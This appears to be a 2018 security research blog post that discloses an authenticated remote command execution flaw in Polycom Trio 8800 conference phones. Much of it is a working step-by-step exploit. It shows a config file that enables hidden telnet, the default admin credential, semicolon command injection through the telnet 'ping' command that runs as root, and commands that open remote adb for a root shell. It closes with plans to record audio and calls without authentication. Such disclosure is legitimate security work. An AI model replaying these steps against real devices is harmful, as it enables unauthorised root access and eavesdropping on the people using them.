---
layout: post
title: "Authenticated RCE in Polycom Trio 8800 pt.1"
date:   2018-11-21
---
![img](https://media.giphy.com/media/l0IyjJm2vNwzokO9a/giphy.gif)


I recently had the opportunity, along with my team, to make some tests in Polycom devices, model being Polycom Trio 8800.
These tests resulted in the discovery of a device command execution fail and until now all firmware versions contain the same vulnerability.


#### Polycom Trio 8800:

![img](https://images-na.ssl-images-amazon.com/images/I/31O7cOW0A0L._SX425_.jpg)

#### Versoes afetadas:
-  5.4.0.12197
-  5.4.0.12541
-  5.4.0.12856
-  5.4.1.17597
-  5.4.2.5400
-  5.4.3.2007
-  5.4.3.2389
-  5.4.3.2400
-  5.4.4.7511
-  5.4.4.7609
-  5.4.4.7776
-  5.4.5.9111
-  5.4.5.9658
-  5.5.2.11338
-  5.5.2.11391
-  5.5.3.3441
-  5.5.3.3517
-  5.5.4.2255
-  5.7.1.4095
-  5.7.1.4133
-  5.7.1.4145

Something that called our attention during the performed tests was that the web page configuration has a functionality to habilitate the debug level on logs and their viewing.

Configurations > Registrations

![img](https://github.com/UnkL4b/unkl4b.github.io/blob/master/img/2018-10-01-181617_1917x932_scrot.png?raw=true)

According to the image below we discovered another interesting point, the possibility to attribute a non official Polycom server update on the device that sends the GET requisitions to the malicious server.

![img](https://github.com/UnkL4b/unkl4b.github.io/blob/master/img/photo_2018-10-01_18-35-44.jpg?raw=true)

Looking at the created logs after configuring the debug, we noticed that it executes native commands, such as CURL, to make the updates. Even though not all tests were successful, it for sure opened up a possibility to inject commands to the update.

![img](https://github.com/UnkL4b/unkl4b.github.io/blob/master/img/photo_2018-10-01_18-53-21.jpg?raw=true)

We then decided to look deeper into the firmware. Me and Matheus Bernardes dissected the firmware aiming to find any codes that would allow us to apply our command injection suspicion.  

We downloaded the latest Polycom firmware release straight from the developer website:

https://support.polycom.com/content/support/emea/emea/en/support/voice/polycom-trio/polycom-trio-8800.html

The analysis began by extracting the content:

`$ unzip Polycom_UC_Software_5_7_1_4133_AB_Trio8800_release.zip`

`$ binwalk -e 3111-65290-001.sip.ld`

This gave us a range of directories with a few interesting files:

```.
├── 118BE102.crt
├── 150F872.bz2
├── 15257DC
├── 152580C
├── 270.zip
├── 40D2589.zip
├── 78E354C.crt
├── bcm911130_pl_rocky_proto2
│   ├── boot.img
│   ├── Combined_images_little.bin
│   ├── dt-blob
│   ├── loader.img
│   ├── u-boot.bin
│   └── vc-firmware.img
├── bcm911130_pl_sandy_proto1
│   ├── boot.img
│   ├── Combined_images_little.bin
│   ├── dt-blob
│   ├── loader.img
│   ├── u-boot.bin
│   └── vc-firmware.img
├── bcm911130_pl_twiggy_proto1
│   ├── boot.img
│   ├── Combined_images_little.bin
│   ├── dt-blob
│   ├── loader.img
│   ├── u-boot.bin
│   └── vc-firmware.img
.....
└── system
    ├── app
    │   ├── AirSquirrels.apk
    │   ├── Bluetooth.apk
    │   ├── Bluetooth.odex
    │   ├── Browser.apk
    │   ├── Browser.odex
    │   ├── CellBroadcastReceiver.apk
    │   ├── CellBroadcastReceiver.odex
    │   ├── CertInstaller.apk
    │   ├── CertInstaller.odex
    │   ├── DeskClock.apk
    │   ├── DeskClock.odex
    │   ├── Development.apk
    │   ├── Development.odex
    │   ├── DocumentsUI.apk
    │   ├── DocumentsUI.odex
    │   ├── DownloadProviderUi.apk
    │   ├── DownloadProviderUi.odex
.....
    ├── plcm
    │   └── bin
    │       ├── blinkLed.sh
    │       ├── build_info.txt
    │       ├── capture_audio
    │       ├── esw_dump.sh
    │       ├── firstBoot.sh
    │       ├── getSlashLog
    │       ├── libbooat.capri.so
    │       ├── libffmpeg.capri.so
    │       ├── libscep.capri.so
    │       ├── libwds.capri.so
    │       ├── logFlusher
    │       ├── ota-to-bg-recover.sh
    │       ├── ota-to-bg-update.sh
    │       ├── otg_disable.sh
    │       ├── pbox
    │       ├── plaunchd
    │       ├── plcmExec
    │       ├── plcmWatchdog
    │       ├── polyapp
    │       ├── populate_hw_properties
    │       ├── postUpdate.sh
    │       ├── qt
.....
```

There are a few system applications inside the directory ```system/plcm/bin/```, amongst them there is the Polycom application, the Polyapp.

We began the Polyapp analysis by pointing a few things that called our attention, including a configuration parameter of the device, in which is not described in the official Polycom documentation.

`$ strings polyapp | grep 'diags.'`

```
diags.dumpcore.enabled
diags.pcap.background.bufferSize
diags.pcap.background.enabled
diags.pcap.background.encryption.enabled
diags.pcap.background.encryption.key
diags.pcap.background.filter
diags.pcap.background.uploadURL
diags.pcap.enabled
diags.pcap.eventInjection.enabled
diags.pcap.flash.fileSize
diags.pcap.remote.enabled
diags.pcap.remote.password
diags.pcap.remote.port
diags.pcap.remote.secure.enabled
diags.pcap.remote.secure.gateway.fingerprint
diags.pcap.remote.secure.gateway.fwdExternalPorts
diags.pcap.remote.secure.gateway.password
diags.pcap.remote.secure.gateway.port
diags.pcap.remote.secure.gateway.server
diags.pcap.remote.secure.gateway.user
diags.serviceAssurance.enabled
diags.serviceAssurance.UploadPath
diags.sip.tlsMasterKeyLogging.enabled
diags.sshc.enabled
diags.sshc.gateway.fingerprint
diags.sshc.gateway.fingerprint.sha1
diags.sshc.gateway.password
diags.sshc.gateway.port
diags.sshc.gateway.server
diags.sshc.gateway.user
diags.system.freeMemoryThreshold
diags.telnetd.enabled
diags.videoStats.enabled
diags.pcap.filter
```


With these parameters we noticed that it’s possible to habilitate the Telnet. So we sent a configuration file that enabled the resource.


```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!-- Application SIP LeafDanube 5.4.5.9658 05-Jul-17 14:41 -->
<!-- Created 28-09-2018 04:38 -->
<!-- Base profile Lync -->
<PHONE_CONFIG>
	<ALL
		diags.sshc.enabled="1"
		diags.telnetd.enabled="1"
		httpd.cfg.enabled="1"
		httpd.cfg.secureTunnelEnabled="0"
		httpd.enabled="1"
		video.codecPref.H264="3"
	/>
</PHONE_CONFIG>
```

The Telnet default door is disabled, so we made a scan and found out that the service goes up by a 1023 pattern.  

```perl
Nmap scan report for xxx.xxx.xxx.xxx
Host is up (0.0026s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
1023/tcp open  netvenuechat
5001/tcp open  commplex-link
5060/tcp open  sip
8001/tcp open  vcom-tunnel
```

The access via Telnet follows the same entry order as the web interface, such as user and password.



```python
In [5]: print(base64.b64decode("UG9seWNvbTo0NTY=").decode("utf-8"))
Polycom:456
```

```
$ telnet xxx.xxx.xxx.xxx 1023
Trying xxx.xxx.xxx.xxx...
Connected to xxx.xxx.xxx.xxx.
Escape character is '^]'.

User: Polycom
Password:

Admin>
```

Through these information we listed the following existing commands:

```
Admin>help
 -
addScheduledLogEntry - Adds a command to be run periodically that outputs to the phone's log.
appPrt - Show UI's call status.
arpShow - Display the contents of the ARP table.
auth - Change authentication level
BtoeHide - Send call hide request.
BtoeUnhide - Send call Unhide request.
certBackOffInfo - Show Cert Back off info
certBackOffSet - Show Cert Back off info
cfgAndroidAppsList - List Android apps, param is list permissions
cfgParamName - Show cfg Param info by passing param name
cfgProvFileTemplateUpload - Uploads templates of the current non-default config to the boot server
cfgProvFlashTemplateUpload - Uploads templates of the current flash config to the boot server
checkStack - Checks the stack.
configSyslogSet - Set Syslog parameters in the flash.
		(Server Address, Server Type, Facility, Render level, Prepend MAC)
confShow - Show conference info.
contentIFrameRequest - request I-Frame from PPCIP/RPD
contentResRequest - request content resolution change
coreAudio - Print core audio information.
coreDumpEncrypt - Set to enable core dump encryption.
cpuLoadShow - Display CPU load (period (s), number of iterations).
cpuUsageShow - Display CPU usage by running Linux top command. [pid]
date - Display the current date.
dbsinfo - Display the database service information
deferwatchdog - Defer All watchdog timers
dhcpcParamsShow - Show DHCP client parameters.
dnsCacheShow - Show DNS cache records.
dosFsShow - Display file system statistics.
dspLoadShow - Display DSP load (period (s), number of iterations).
dump - Dump file to terminal, including decompressing compressed files
endErrShow - Show END device error stats.
ethBufPoolShow - Display the state of the ethernet pool stack(no parameters)
ethFilterShow - Show Ethernet ingress filter stats.
fschk - Check phone's file system
getLyncStatusInfo - Display Lync Status Information
help - Shows basic help for all commands.
hostShow - Show host table.
i - Display status of the specified process, or all running processes (Process_name (optional))
icmpstatShow - Show ICMP statistics.
ifShow - Display ethernet interface statistics (no parameters)
inetstatShow - Show transport layer network status.
iosFdShow - Show file descriptors in use.
ipstatShow - Show IP layer network statistics.
keyPrt - Shows information about the key mapping.
la - List all files in the flash filesystem, including subdirectories.
lfu - Send the logfiles to the provisioning server(no parameters).
linkShow - Show link status.
ll - List files in the flash filesystem (long format).
logd - Dump the log, parameter is reverse order or not.
logda - Print all available log modules and their current level.
logFullSip - Enable:1 or Disable:0 full sip message logging. If enabled fragmented SIP packets are not logged but whole SIP message is logged
logl - Set the lowest log level which will be displayed (0-6)
logr - Set the renderStdout parameter for the log.
logreg - Set the registration list for sip message log filtering
logs - Set the log level output for a given module ([module] [0-6])
logsa - Set the log level output for all modules. ([0-6])
logt - Set the log display type (0-2)
ls - List files in the flash filesystem.
makeDial - makeDial <url>
Hit q to quit, enter to continue.

medSess - Show detailed information on the current media session(s),
		related to active calls, offerings, or the free list(1, 2, 3 or 4)

medSessStat - medSessStat - Show call statistics of the active media session(s)
memShow - Display heap memory statistics.
mrAudio - Show remote audio status
mrAudioBindAll - Debug to override remote audio bindings
mrCamDump - Dump the Systems Camera Information
mrConn - Display MR connection status
mrDevConnectInfo - Display another set of MR status
mrDisDump - Dump the Systems Display Information
mrDisLayoutAuto - set Display Layout to Auto
mrDisLayoutFull - set Display Layout to Full screen
mrDisLayoutGallery - Set displayLayout to Gallery
mrDisLayoutPIP - set Display Layout to PIP
mrDump - Display another set of MR status
mrFastUpdateRequest - send FUB ,RTCP(I-Frame) request
mrHideVideo - Hide video on the screen
mrHideVideoErrorImage - Hide video error image on the screen
mrMute - Mutes the modularRoomVideo
mrNextCam - Select the next Camera
mrNextLayout - change to next layout
mrNextVideoSource - Select the next Video Source
mRouteShow - Display IP routing table.
mrPairDel - Delete a specific MR pair
mrProtocolUpload - Upload example JSON messages to the provisioning server
mrProvUpdate - Provision from a full URI (nasty hack)
mrRebootSystem - Reboots the hub and any paired devices
mrRestartSystem - Restarts the hub and any paired devices
mrSetVideoWindowType - Set the video window type
mrShow - Display MR status
mrShowPopup - Show a pop-up on Rocky or any paired Twiggy
mrShowVideo - Show video at a specific position on the screen
mrShowVideoErrorImage - Show video error image
mrShowVideoInfo - Show or hide video diagnostic information
mrToggleLCV - Enable/Disable Local Camera View
msCallPark - Show detailed information on the MS Call Park session(s),

ncasCb - Show detailed ncas information, related to either call services,
		non-call services, or server information (1, 2, or 3)
ncasMisc - Show misc. non-call information (no parameters)
netCCB - Display open RTP ports and their status (no parameters)
netRxShow - Show network receive stats summary.
nslookup - Find the IP for a given hostname
pcapFilterSet - Set capture filter used with packet capture to USB flash drive
pcapStart - Start packet capture to USB flash drive
pcapStop - Stop packet capture to USB flash drive
pcapUpload - Upload background packet capture file
ping - Ping a given host (IPv4 or DNS name) [,Data Len in Bytes]
playerStateGet - Show player playbacks status.(no parameters)
printCurrentLocation - GENBAND: Print the current Location Description.

printCurrentTimestamp - GENBAND: Print the current Location information timestamp.

printLocationtree - GENBAND: Print the Location Tree.

pwrsvStat - display power saving status and configuration.
removeScheduledLogEntry - Remove a scheduled log entry.
resetTelnetList - Resets all telnet connections
resPrt - Show information about the resource finder.
routeShow - Display the contents of the routing table(no parameters)
setLocationID - GENBAND: Set the new locationID.

setTimestamp - GENBAND: Set a new timestamp to force location tree download.

showBackupConfig - Display backup configuration as stored in flash (no parameters)
showChannel - Display Ptt Page Channels information
showDeviceUpdateInfo - Display the Device Update configurations.
showEcho - Show acoustic echo cancellation/suppression status.
Hit q to quit, enter to continue.

showGains - Show acoustic termination gains.
showHdPcm - Show Headset PCM channel status.
showHfPcm - Show Hands-free (chassis) PCM channel status.
showHsPcm - Show Handset PCM channel status.
showPcmAll - Show all PCM channels status.
showRunningConfig - Display the current running configuration (no parameters)
showStoredConfig - Display configuration as stored in flash (no parameters)
showTelnetList - Shows telnet and pmtPty list
showUCDInfo - Display the Device Update configurations.
showWlanMode - Display current wlan mode
showWlanModeMap - Display current wlan mode map
sipOutageToggle - toggle : create or remove outage.
sipPrt - Show SIP stack status.
sipSetAdmSubExp - set Exp SipCallStateSubscribeRoamingSelfOnBehalfOfBoss.
sspsDspBuf - Request DSP buffer status.
sspsMsgShow - Show msg hdi buffers.
sspsShow - Show hdi buffers.
sspsShowMix - Show mixer bindings.
streams - Show detailed information on the active RTP streams

syslogl - Set the lowest syslog level which will be displayed (0-6)
syslogsr - Set the syslog server IP address or Hostname
syslogtr - Set the syslog transport method [udp|tcp|none]
tcpstatShow - Show TCP network statistics.
time - Show current time.
timerShow - Show rtos timer information.
top - Run Linux top command. [pid]
tpcpStatus - Show TPCP Conversation status.
traceroute - Display the route taken by packets across an IP network for a given host (IPv4 or DNS name)
TSID - Push the Tech Support Information Dump to the log (Does not reboot).
udpstatShow - Show UDP network statictics.
uiXml - Returns the UIXML command output.
upbasedeferval - Update base defer value
uploadCSR - Upload Generated private key and CSR [ Common Name Org Country State EmailAddress ]
uptime - Show phone uptime.
usbShow - Display USB port name (Plugged in a USB device before running this.)
utilBufPoolStatus - Display RTP current memory usage.
VC4DumpVid - Dump video frames to disk
version - Display software and hardware version numbers.
wtPrt - Show Web Ticket status.

```

Following the modem patterns, I tested the ping command followed by a semicolon (;) to confirm if I could execute other commands, obtaining a positive result.


```bash
Admin>ping 8.8.8.8 ; id
bspLinuxPopen: Forking command 0 process '/system/bin/sh -c /system/bin/ping -c 3 -W 3 8.8.8.8 ; id > /tmp/plcmExecFifoExtra4'
1015162316|dns  |4|00|utilStripLeadZeroFrmIpAddr: ipaddress 8.8.8.8 ; id  is not a valid IP
uid=0(root) gid=0(root)
```

Listing the directories, I found the /sbin in which there is the adbd. From the fact that these devices use the Android default system, I was able habilitate the remote adb.


```bash
Admin>ll /sbin
drwxr-x---  1 0       0                0 Dec 31  1969 ./
drwxr-xr-x  1 0       0                0 Jan  1  1970 ../
-rwxr-x---  1 0       0           183616 Dec 31  1969 watchdogd
-rwxr-x---  1 0       0           183616 Dec 31  1969 ueventd
-rwxr-x---  1 0       0           124820 Dec 31  1969 healthd
-rwxr-x---  1 0       0           166188 Dec 31  1969 adbd

Admin>ping 8.8.8.8 ; setprop service.adb.tcp.port 5555
bspLinuxPopen: Forking command 0 process '/system/bin/sh -c /system/bin/ping -c 3 -W 3 8.8.8.8 ; setprop service.adb.tcp.port 5555 > /tmp/plcmExecFifoExtra6'
1015162739|dns  |4|00|utilStripLeadZeroFrmIpAddr:length of ipaddress is not correct 43

Admin>ping 8.8.8.8 ; stop adbd
bspLinuxPopen: Forking command 0 process '/system/bin/sh -c /system/bin/ping -c 3 -W 3 8.8.8.8 ; stop adbd > /tmp/plcmExecFifoExtra7'
1015162755|dns  |4|00|utilStripLeadZeroFrmIpAddr:length of ipaddress is not correct 19

Admin>ping 8.8.8.8 ; start adbd
bspLinuxPopen: Forking command 0 process '/system/bin/sh -c /system/bin/ping -c 3 -W 3 8.8.8.8 ; start adbd > /tmp/plcmExecFifoExtra8'
1015162806|dns  |4|00|utilStripLeadZeroFrmIpAddr:length of ipaddress is not correct 20
```

Done! We now have the root access to Polycom.

```
unkl4b ~> adb connect xxx.xxx.xxx.xxx
* daemon not running. starting it now on port 5037 *
* daemon started successfully *
connected to xxx.xxx.xxx.xxx:5555

unkl4b ~> adb shell

root@capri_pl_rocky_proto2:/ # id
uid=0(root) gid=0(root)
```

#### Conclusao
Because the RCE is authenticated, it hinders the execution, however by standard the admin password is 456 which makes it easier to access. From that, if there is a standard password change it’s possible to apply a bruteforce attack at the web application. This first part of the research shows the execution command, nevertheless we are still studying other accesses and attacks possibilities on the device so that attackers can, without authentication, be able to record surrounding audio and phone calls.

![img](https://github.com/UnkL4b/unkl4b.github.io/raw/master/img/photo_2018-10-15_15-35-52.jpg)

![img](https://github.com/UnkL4b/unkl4b.github.io/raw/master/img/photo_2018-10-15_15-36-00.jpg)
